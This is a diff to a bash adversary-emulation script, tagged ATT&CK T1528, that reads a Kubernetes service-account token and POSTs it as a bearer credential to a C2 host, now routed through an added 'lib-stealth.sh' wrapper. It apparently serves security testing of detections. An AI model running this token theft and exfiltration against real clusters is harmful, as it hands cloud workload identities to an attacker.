@@ -15,6 +15,7 @@
 #   present stolen token to a cloud API       Steal Application Access Token       (T1528)
 # ---------------------------------------------------------------------------
 set -u
+source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"
 
 RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
 C2_HOST="${C2_HOST:-control-api}"
@@ -40,10 +41,8 @@ NAMESPACE="$(cat "${SA_DIR}/namespace" 2>/dev/null || echo unknown)"
 say "discovered token for namespace='${NAMESPACE}' (${#TOKEN} chars)"
 
 step "credential use — present stolen token to a cloud/K8s API (ATT&CK T1528)"
-RESP="$(curl -s --max-time 5 -X POST \
-    -H "Authorization: Bearer ${TOKEN}" \
-    -d "namespace=${NAMESPACE}" \
-    "http://${C2_HOST}:${C2_PORT}/cloud/identity")"
+st_mark T1528 "token-exchange"
+RESP="$(st_http POST "http://${C2_HOST}:${C2_PORT}/cloud/identity" "namespace=${NAMESPACE}" "Authorization: Bearer ${TOKEN}")"
 say "token-exchange response: $RESP"
 
 step "Done — workload-identity-theft emulation complete."
